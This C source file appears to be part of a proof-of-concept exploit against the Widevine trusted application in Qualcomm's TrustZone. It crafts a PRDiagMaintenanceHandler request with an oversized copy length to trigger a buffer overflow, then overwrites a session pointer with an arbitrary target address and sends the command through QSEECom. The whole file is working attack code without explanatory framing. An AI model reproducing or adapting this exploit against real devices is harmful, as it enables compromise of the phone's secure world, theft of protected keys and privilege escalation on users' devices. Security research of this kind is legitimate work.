#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include "QSEEComAPI.h"
#include "widevine_commands.h"
#include "defs.h"
#include "symbols.h"

int overwrite_session_pointer(struct qcom_wv_handle* handle, uint32_t session_id, uint32_t target_ptr) {

	uint32_t cmd_req_size = QSEECOM_ALIGN(0x4000);
	uint32_t cmd_resp_size = QSEECOM_ALIGN(8);
	uint32_t* cmd_req = malloc(cmd_req_size);
	uint32_t* cmd_resp = malloc(cmd_resp_size);

	//Filling the request buffer with zeros to prevent overflowing data with harmful bytes
	memset(cmd_req, 0, cmd_req_size);

	//Filling the response buffer with marker bytes so we can easily see when the app crashes
	memset(cmd_resp, 'B', cmd_resp_size);

	//Crafting the header needed to create the overflow
	cmd_req[0] = PRDiagMaintenanceHandler;
	cmd_req[1] = TZ_MESSAGE_SIZE;		//pTzMsg size
										//---pTzMsg starts here---
	cmd_req[2] = 0;						//type flag, 0=PRDiagVerifyProvisioning
	cmd_req[3] = 0;						//unused
	cmd_req[4] = OVERFLOW_COPY_SIZE;	//copy size
	cmd_req[5] = 0;						//must be zero to reach wanted flow
										//---copied buffer starts here---

	//Writing the sync pattern
	for (uint32_t i=0; i<sizeof(g_sync_pattern)/(2*sizeof(uint32_t)); i++) {
		cmd_req[6 + g_sync_pattern[2*i + 1]] = g_sync_pattern[2*i];
	}

	//Overwriting the session pointer	
    cmd_req[(WV_SESSION_OFFSET - START_OVERFLOW_OFFSET)/sizeof(uint32_t) + 6 + session_id] = target_ptr; 

    int res = (*handle->QSEECom_set_bandwidth)(handle->qseecom, true);
    if (res < 0) {
        free(cmd_req);
        free(cmd_resp);
        perror("[-] Unable to enable clks");
        return -errno;
    }

    res = (*handle->QSEECom_send_cmd)(handle->qseecom,
                                      cmd_req,
                                      cmd_req_size,
                                      cmd_resp,
                                      cmd_resp_size);

    if ((*handle->QSEECom_set_bandwidth)(handle->qseecom, false)) {
        perror("[-] Import key command: (unable to disable clks)");
    }

	free(cmd_req);
	free(cmd_resp);
	return res;
}

